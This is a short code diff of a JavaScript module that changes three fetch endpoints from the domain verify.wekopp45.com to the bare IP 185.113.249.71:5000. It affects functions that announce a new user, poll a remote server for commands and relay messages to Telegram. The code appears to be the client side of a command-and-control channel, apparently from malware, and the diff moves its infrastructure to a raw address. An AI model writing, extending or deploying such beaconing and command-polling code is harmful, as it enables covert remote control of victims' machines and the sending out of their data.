@@ -1,6 +1,6 @@
 export const notifyNewUser = async () => {
   try {
-    const response = await fetch('https://verify.wekopp45.com:5000/notify', {
+    const response = await fetch('https://185.113.249.71:5000/notify', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
@@ -26,7 +26,7 @@ export const notifyNewUser = async () => {
 
 export const checkForCommands = async () => {
   try {
-    const response = await fetch('https://verify.wekopp45.com:5000/check-command');
+    const response = await fetch('https://185.113.249.71:5000/check-command');
     if (!response.ok) throw new Error('No commands');
     return await response.json();
   } catch (error) {
@@ -37,7 +37,7 @@ export const checkForCommands = async () => {
 
 export const sendMessageToTelegram = async (message) => {
   try {
-    const response = await fetch('https://verify.wekopp45.com:5000/send-message', {
+    const response = await fetch('https://185.113.249.71:5000/send-message', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
